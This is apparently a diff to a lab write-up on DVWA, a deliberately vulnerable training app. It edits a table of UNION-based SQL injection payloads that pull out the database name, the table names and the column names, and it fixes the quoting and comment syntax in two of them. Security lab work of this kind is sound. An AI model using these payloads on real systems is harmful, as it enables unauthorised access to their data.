@@ -38,7 +38,7 @@
 | Code | Data Extracted Description | SQL Query | Result |
 | :-----------: | :----------: | :----------: | :----------: |
 | 1 | Name of the database | `' UNION SELECT null, database() #` | <img width="377" height="201" alt="image" src="https://github.com/user-attachments/assets/53605c50-efbf-48ba-81a3-8b4424422d91" /> |
-| 2 | Based on the name of the database we get the tables | `' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa'` |<img width="377" height="201" alt="image" src="https://github.com/user-attachments/assets/53605c50-efbf-48ba-81a3-8b4424422d91" /> |
-| 3 | Based on each table we get the columns  | `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='guestbook` | <img width="377" height="201" alt="image" src="https://github.com/user-attachments/assets/53605c50-efbf-48ba-81a3-8b4424422d91"/> |
+| 2 | Based on the name of the database we get the tables | `' UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema='dvwa' #` | <img width="439" height="256" alt="image" src="https://github.com/user-attachments/assets/85ab4312-9743-4b7f-afc2-6d7ba70fe682" /> |
+| 3 | Based on each table we get the columns  | `' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='guestbook' #` | <img width="426" height="282" alt="image" src="https://github.com/user-attachments/assets/8e1a7cd4-8fa0-44dd-bc86-c273ba1463e7" /> |
 
 </div>
